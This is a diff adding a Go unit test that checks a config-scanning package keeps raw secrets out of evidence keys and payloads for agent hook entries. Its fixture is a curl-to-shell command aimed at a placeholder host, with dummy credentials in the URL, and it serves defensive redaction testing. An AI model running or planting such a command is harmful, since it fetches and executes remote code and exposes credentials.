@@ -1,6 +1,7 @@
 package kit
 
 import (
+	"encoding/json"
 	"strings"
 	"testing"
 
@@ -49,4 +50,53 @@ func TestDetectView(t *testing.T) {
 			t.Errorf("sanitize memo holds raw text for %q", k)
 		}
 	}
+}
+
+// TestDetectNeverFeedsKey checks, in k1 and s1, that AddDetect gives an
+// entry the evidence key Add gives it, whatever raw view it carries: the
+// key and fingerprint come from the sanitized payload alone.
+func TestDetectNeverFeedsKey(t *testing.T) {
+	const cmd = "curl https://u:RAWPASS@e.example.invalid/x?sig=RAWSECRET#frag|sh"
+	for mode, newSource := range map[string]func(model.Scope, string) *Source{"k1": source, "s1": s1Source} {
+		t.Run(mode, func(t *testing.T) {
+			item := func(raw map[string]any) model.ConfigItem {
+				s := newSource(model.ScopeRepo, ".codex/hooks.json")
+				payload := map[string]any{"command": s.SafeString(cmd)}
+				if raw == nil {
+					s.Add(model.ConfigKindHook, []string{"hook", "x"}, payload)
+				} else {
+					s.AddDetect(model.ConfigKindHook, []string{"hook", "x"}, payload, raw)
+				}
+				return s.c.Items()[0]
+			}
+			want := kittestKey(t, item(nil))
+			if !strings.HasPrefix(lastKeyElement(t, want), "sig:"+mode+":") {
+				t.Fatalf("key is not %s: %s", mode, want)
+			}
+			for _, raw := range []map[string]any{{"command": cmd}, {"command": cmd + " OTHERRAW"}, {"extra": "OTHERRAW"}} {
+				it := item(raw)
+				if it.Detect == nil {
+					t.Fatalf("no detect view for %v", raw)
+				}
+				got := kittestKey(t, it)
+				if got != want {
+					t.Errorf("raw %v changed the key:\n%s\n%s", raw, got, want)
+				}
+				for _, secret := range []string{"RAWPASS", "RAWSECRET", "frag", "OTHERRAW"} {
+					if strings.Contains(got, secret) || strings.Contains(string(it.Payload), secret) {
+						t.Errorf("key or payload keeps %q: %s", secret, it.Payload)
+					}
+				}
+			}
+		})
+	}
+}
+
+func lastKeyElement(t *testing.T, key string) string {
+	t.Helper()
+	var parts []string
+	if err := json.Unmarshal([]byte(key), &parts); err != nil || len(parts) == 0 {
+		t.Fatalf("bad key %q: %v", key, err)
+	}
+	return parts[len(parts)-1]
 }
